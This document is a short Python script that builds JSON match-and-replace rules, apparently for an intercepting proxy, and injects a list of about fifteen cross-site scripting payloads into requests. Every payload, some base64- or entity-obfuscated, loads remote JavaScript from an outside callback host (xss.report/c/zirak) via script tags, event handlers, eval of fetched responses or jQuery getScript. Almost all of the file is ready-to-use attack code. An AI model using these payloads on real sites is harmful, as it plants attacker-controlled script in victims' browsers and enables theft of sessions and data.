import json

payloads = [
    '\'"><script src=https://xss.report/c/zirak></script>',
    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3ppcmFrIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>',
    "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/zirak\';document.body.appendChild(a)')",
    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3ppcmFrIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>',
    '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3ppcmFrIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>',
    '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/zirak&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
    '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/zirak");a.send();</script>',
    '<script>$.getScript("//xss.report/c/zirak")</script>',
    'var a=document.createElement("script");a.src="https://xss.report/c/zirak";document.body.appendChild(a);',
    "<svg onload=\"javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/zirak\';document.body.appendChild(a)')\" />",
    "<iframe src=\"javascript:var a=document.createElement('script');a.src='https://xss.report/c/zirak';document.body.appendChild(a)\"></iframe>",
    "<div onmouseover=\"var a=document.createElement('script');a.src='https://xss.report/c/zirak';document.body.appendChild(a)\">Hover me</div>",
    "<div onmouseover=\"var a=document.createElement('script');a.src='https://xss.report/c/zirak';document.body.appendChild(a)\">Hover me</div>",
    "<audio src=\"x\" onerror=\"var a=document.createElement('script');a.src='https://xss.report/c/zirak';document.body.appendChild(a)\">",
    "<body onload=\"var a=document.createElement('script');a.src='https://xss.report/c/zirak';document.body.appendChild(a)\">"
]

result = []

for i, payload in enumerate(payloads, start=1):
    result.append({
        "category": f"XSS {i} payload",
        "enabled": True,
        "rule_type": "request_first_line",
        "string_match": f"xss{i}",
        "string_replace": payload
    })

print(json.dumps(result, indent=4))
